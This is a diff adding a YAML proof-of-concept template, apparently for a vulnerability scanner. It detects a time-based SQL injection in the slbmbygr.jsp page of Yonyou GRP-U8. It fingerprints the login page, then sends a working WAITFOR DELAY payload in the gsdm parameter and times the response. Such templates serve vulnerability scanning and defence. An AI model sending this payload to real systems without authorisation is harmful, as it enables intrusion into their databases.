@@ -1,0 +1,17 @@
+id: poc-yaml-grp-u8-slbmbygr-jsp-sqli
+info:
+  name: 用友-GPR-U8 slbmbygr.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /login.jsp
+  expression: status_code == 200 && contains(title,"用友GRP-U8")
+- method: GET
+  path: /u8qx/slbmbygr.jsp?gsdm=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,"") && duration > t1
+transport: http
